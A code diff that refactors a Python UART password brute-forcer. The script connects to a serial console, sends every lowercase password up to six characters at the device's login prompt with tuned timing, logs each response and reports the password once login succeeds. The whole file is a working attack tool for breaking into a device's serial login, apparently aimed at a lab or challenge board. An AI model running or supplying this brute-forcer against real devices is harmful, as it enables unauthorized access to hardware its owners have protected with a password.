@@ -3,7 +3,16 @@ import serial
 import time
 import string
 import sys
+import re
+import logging
 from itertools import product
+
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    datefmt='%Y-%m-%d %H:%M:%S'
+)
 
 class UARTBruteforcer:
     def __init__(self, port='/dev/serial0', baud=115200):
@@ -13,40 +22,30 @@ class UARTBruteforcer:
         self.attempts = 0
         self.start_time = None
         self.results_file = None
+        self.logger = logging.getLogger(__name__)
+
+    def strip_ansi_escape_sequences(self, text):
+        """Remove ANSI escape sequences from text"""
+        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
+        return ansi_escape.sub('', text)
 
     def connect(self):
         try:
             self.ser = serial.Serial(
                 port=self.port,
                 baudrate=self.baud,
-                timeout=0.1  # Reduced timeout
+                timeout=1.0
             )
-            # Clear any pending data
-            self.ser.reset_input_buffer()
-            self.ser.reset_output_buffer()
-            print(f"[+] Connected to {self.port}")
-            
-            # Wait for initial prompt
-            print("[*] Waiting for initial prompt...")
-            time.sleep(0.5)  # Reduced wait time
-            
-            # Send a newline to trigger the prompt
-            self.ser.write(b'\r\n')
-            time.sleep(0.1)  # Reduced wait time
-            
-            # Read any initial output
-            while self.ser.in_waiting:
-                self.ser.readline()
-            
+            self.logger.info(f"Connected to {self.port}")
             return True
         except Exception as e:
-            print(f"[-] Connection error: {e}")
+            self.logger.error(f"Connection error: {e}")
             return False
 
     def disconnect(self):
         if self.ser and self.ser.is_open:
             self.ser.close()
-            print("[+] Disconnected")
+            self.logger.info("Disconnected")
         if self.results_file:
             self.results_file.close()
 
@@ -57,165 +56,168 @@ class UARTBruteforcer:
             self.results_file.write("======================\n\n")
             self.results_file.write(f"Start time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
             self.results_file.flush()
-            print(f"[+] Results will be saved to {filename}")
+            self.logger.info(f"Results will be saved to {filename}")
         except Exception as e:
-            print(f"[-] Error creating results file: {e}")
+            self.logger.error(f"Error creating results file: {e}")
             self.results_file = None
 
-    def log_result(self, test, response, raw_response=None):
+    def log_result(self, test, response):
         if self.results_file:
             try:
-                filtered_response = response
-                # Extract just the error message without any additional lines
-                if "Invalid password" in response:
-                    filtered_response = "ERR: Invalid password. Please try again."
-                elif "successful" in response.lower():
-                    filtered_response = "SUCCESS: Login successful"
-                # Log both filtered and raw response
-                self.results_file.write(f"Attempt {self.attempts}: {test} - {filtered_response}\n")
-                if raw_response is not None:
-                    self.results_file.write(f"  [RAW] {raw_response}\n")
+                # Strip ANSI codes from response
+                clean_response = self.strip_ansi_escape_sequences(response)
+                
+                # Split into lines and clean each line
+                lines = clean_response.split('\n')
+                cleaned_lines = []
+                for line in lines:
+                    # Remove carriage returns and extra spaces
+                    line = line.replace('\r', '').strip()
+                    if line:  # Only keep non-empty lines
+                        cleaned_lines.append(line)
+                
+                # Join lines with newlines
+                clean_response = '\n'.join(cleaned_lines)
+                
+                # Always log the attempt and response
+                self.results_file.write(f"Attempt {self.attempts}: {test}\n")
+                self.results_file.write(f"Response:\n{clean_response}\n")
+                self.results_file.write("-" * 50 + "\n")
                 self.results_file.flush()
+                
+                # Also print to console for immediate feedback
+                self.logger.debug(f"Response for {test}:")
+                self.logger.debug(clean_response)
             except Exception as e:
-                print(f"[-] Error writing to results file: {e}")
+                self.logger.error(f"Error writing to results file: {e}")
 
-    def wait_for_prompt(self):
-        """Wait for the password prompt"""
-        timeout = time.time() + 1  # Reduced timeout to 1 second
-        while time.time() < timeout:
-            if self.ser.in_waiting:
-                line = self.ser.readline().decode().strip()
-                if "Please enter password:" in line:
-                    return True
-            time.sleep(0.05)  # Reduced sleep time
-        return False
-
-    def read_response(self):
-        """Read complete response with timeout"""
-        response = []
-        start_time = time.time()
-        max_retries = 2  # Reduced retries
-        retry_count = 0
-        
-        while retry_count < max_retries:
-            while time.time() - start_time < 0.5:  # Reduced timeout to 0.5 seconds
-                if self.ser.in_waiting:
-                    line = self.ser.readline().decode().strip()
-                    if line:  # Only add non-empty lines
-                        # Skip prompt lines
-                        if "Please enter password:" in line:
-                            continue
-                        # Only add error or success messages
-                        if "Invalid password" in line or "successful" in line.lower():
-                            response.append(line)
-                            return "\n".join(response)
-                time.sleep(0.05)  # Reduced sleep time
-            
-            # If we get here, we didn't get a response
-            retry_count += 1
-            if retry_count < max_retries:
-                # Send a newline to trigger the prompt
-                self.ser.write(b'\r\n')
-                time.sleep(0.1)  # Reduced wait time
-                start_time = time.time()  # Reset timeout for next retry
-        
-        return "ERR: No response received after multiple retries"
-
-    def send_input(self, data):
+    def send_password(self, password):
         if not self.ser:
             return None
         try:
-            # Clear any pending input
+            # Clear buffers
             self.ser.reset_input_buffer()
+            self.ser.reset_output_buffer()
+            time.sleep(0.05)  # Reduced from 0.1
             
-            # Send a newline to trigger the prompt if needed
-            self.ser.write(b'\r\n')
-            time.sleep(0.1)  # Reduced wait time
+            # Send newline to get prompt
+            self.ser.write(b'\n')
+            time.sleep(0.2)  # Reduced from 0.3
             
-            # Wait for password prompt
-            if not self.wait_for_prompt():
-                print("[-] Timeout waiting for password prompt")
-                return None
+            # Clear any response from the newline
+            self.ser.reset_input_buffer()
+            time.sleep(0.05)  # Reduced from 0.1
             
-            # Send password
-            self.ser.write(data.encode() + b'\r\n')
-            time.sleep(0.1)  # Reduced wait time
+            # Send password character by character
+            for char in password:
+                self.ser.write(char.encode())
+                time.sleep(0.03)  # Reduced from 0.05
             
-            # Read response with retries
-            response = self.read_response()
+            # Send newline to complete password
+            self.ser.write(b'\n')
+            
+            # Wait for response
+            time.sleep(0.2)  # Reduced from 0.3
+            
+            # Read response
+            response = ""
+            start_time = time.time()
+            last_char_time = time.time()
+            
+            while time.time() - start_time < 0.8:  # Reduced from 1.0
+                if self.ser.in_waiting:
+                    try:
+                        # Read all available data
+                        data = self.ser.read(self.ser.in_waiting).decode()
+                        response += data
+                        last_char_time = time.time()
+                        
+                        # If we see a complete error message, we can stop
+                        if "Invalid password. Please try again." in response:
+                            break
+                    except UnicodeDecodeError:
+                        continue
+                else:
+                    # If no data for 0.2 seconds, assume response is complete
+                    if time.time() - last_char_time > 0.2:  # Reduced from 0.3
+                        break
+                time.sleep(0.05)  # Reduced from 0.1
             
             self.attempts += 1
-            return response
+            return response  # Keep all whitespace and newlines
         except Exception as e:
-            print(f"[-] Error sending data: {e}")
+            self.logger.error(f"Error sending password: {e}")
             return None
 
     def bruteforce(self, min_length=1, max_length=6):
-        print("\n[*] Starting bruteforce attack...")
+        self.logger.info("Starting bruteforce attack...")
         self.start_time = time.time()
-        last_rate_time = time.time()
-        last_attempts = 0
         
-        # Calculate total combinations for worst-case time estimate
+        # Calculate total combinations
         total_combinations = sum(len(string.ascii_lowercase) ** length for length in range(min_length, max_length + 1))
-        print(f"[*] Total combinations to try: {total_combinations:,}")
+        self.logger.info(f"Total combinations to try: {total_combinations:,}")
         
-        # Try all lowercase combinations from min_length to max_length
+        # Try all lowercase combinations
         for length in range(min_length, max_length + 1):
-            combinations = len(string.ascii_lowercase) ** length
-            print(f"\n[*] Trying {length} character combinations ({combinations:,} passwords)...")
+            self.logger.info(f"Trying {length} character combinations...")
             for combo in product(string.ascii_lowercase, repeat=length):
                 test = ''.join(combo)
-                response = self.send_input(test)
-                raw_response = response  # Save the raw response
+                # Skip until we reach 'cya'
+                # if test < 'cxa':
+                #     continue
+                    
+                response = self.send_password(test)
                 
                 if response is None:
-                    print("[-] No response received, retrying...")
+                    self.logger.warning("No response received, retrying...")
                     time.sleep(1)
                     continue
                 
-                # Log the attempt (both filtered and raw)
-                self.log_result(test, response, raw_response)
+                # Log the attempt
+                self.log_result(test, response)
                 
-                # Calculate and display rates every second
-                current_time = time.time()
-                if current_time - last_rate_time >= 1.0:
-                    # Calculate current rate
-                    current_rate = (self.attempts - last_attempts) / (current_time - last_rate_time)
-                    
-                    # Calculate average rate
-                    elapsed = current_time - self.start_time
-                    avg_rate = self.attempts / elapsed if elapsed > 0 else 0
-                    
-                    # Calculate estimated time remaining
-                    remaining_attempts = total_combinations - self.attempts
-                    time_remaining = remaining_attempts / avg_rate if avg_rate > 0 else 0
-                    
-                    # Calculate percentage complete
-                    percent_complete = (self.attempts / total_combinations * 100) if total_combinations > 0 else 0
-                      
-                    # Display statistics
-                    print(f"\r[*] Current: {current_rate:.1f} p/s | Avg: {avg_rate:.1f} p/s | "
-                          f"Progress: {self.attempts:,}/{total_combinations:,} ({percent_complete:.1f}%) | "
-                          f"Current: {test} | "
-                          f"Elapsed: {elapsed/60:.1f} min | "
-                          f"Est. remaining: {time_remaining/60:.1f} min | ", end="", flush=True)
-                    
-                    last_rate_time = current_time
-                    last_attempts = self.attempts
+                # Calculate timing statistics
+                elapsed = time.time() - self.start_time
+                rate = self.attempts / elapsed if elapsed > 0 else 0
                 
-                # Check for successful login
-                if response and "successful" in response.lower():
+                # Calculate estimated time for full perimeter
+                remaining_combinations = total_combinations - self.attempts
+                estimated_time_remaining = remaining_combinations / rate if rate > 0 else 0
+                
+                # Format time strings
+                elapsed_str = self.format_time(elapsed)
+                remaining_str = self.format_time(estimated_time_remaining)
+                
+                # Display progress
+                print(f"\r[*] Current: {test} | Rate: {rate:.1f} p/s | Attempts: {self.attempts:,} | Elapsed: {elapsed_str} | Remaining: {remaining_str}", end="", flush=True)
+                
+                # Check for success
+                clean_response = self.strip_ansi_escape_sequences(response)
+                if "successful" in clean_response.lower():
                     elapsed = time.time() - self.start_time
                     success_msg = (f"\n[+] Password found: {test}\n"
                                  f"[+] Attempts: {self.attempts:,}\n"
-                                 f"[+] Time taken: {elapsed:.1f} seconds\n"
+                                 f"[+] Time taken: {self.format_time(elapsed)}\n"
                                  f"[+] Average rate: {self.attempts/elapsed:.1f} passwords/second")
-                    print(success_msg)
+                    self.logger.info(success_msg)
                     if self.results_file:
                         self.results_file.write(f"\n{success_msg}\n")
                         self.results_file.flush()
                     return test
+
+    def format_time(self, seconds):
+        """Format seconds into a human-readable time string"""
+        if seconds < 60:
+            return f"{seconds:.1f}s"
+        elif seconds < 3600:
+            minutes = seconds / 60
+            return f"{minutes:.1f}m"
+        elif seconds < 86400:
+            hours = seconds / 3600
+            return f"{hours:.1f}h"
+        else:
+            days = seconds / 86400
+            return f"{days:.1f}d"
 
     def finalize_results(self):
         if self.results_file:
@@ -227,7 +229,7 @@ class UARTBruteforcer:
                 self.results_file.write(f"End time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                 self.results_file.flush()
             except Exception as e:
-                print(f"[-] Error finalizing results file: {e}")
+                self.logger.error(f"Error finalizing results file: {e}")
 
 def main():
     if len(sys.argv) < 2 or len(sys.argv) > 4:
